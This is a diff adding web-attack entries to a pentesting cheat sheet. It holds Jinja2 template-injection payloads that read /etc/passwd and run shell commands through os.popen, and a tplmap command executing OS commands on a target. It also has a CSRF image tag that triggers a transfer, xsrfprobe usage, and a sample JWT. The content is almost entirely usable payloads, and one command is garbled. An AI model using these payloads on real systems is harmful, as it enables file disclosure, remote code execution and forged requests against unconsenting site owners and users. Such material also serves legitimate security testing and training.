@@ -114,7 +114,27 @@ flask for instance
 check
 {{2+2}}
 LFI
-{{ ''.__class__.__mro__[2].__subclasses__()[40]()(<file>).read()}}
+{{ ''.__class__.__mro__[2].__subclasses__()[40]()(/etc/passwd).read()}}
 RCE
 {{config.__class__.__init__.__globals__['os'].popen(<command>).read()}}
 ```
+https://github.com/epinna/tplmap
+```
+./tplmap.py -u http://10.10.10.10:5000/ -d 'noot' --os-cmd "cat/ etc/passwd"
+```
+
+### CSRF (Cross Site Request Forgery)
+
+<img src="http://localhost:3000/transfer?to=alice&amount=100">
+```
+pip3 install xsrfprobe
+xsrfprobe -u <url>/<endpoint>
+```
+
+### JWT (JSON Web Token)
+
+```
+"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+HEAD.PAYLOAD.SECRET
+```
+https://jwt.io/
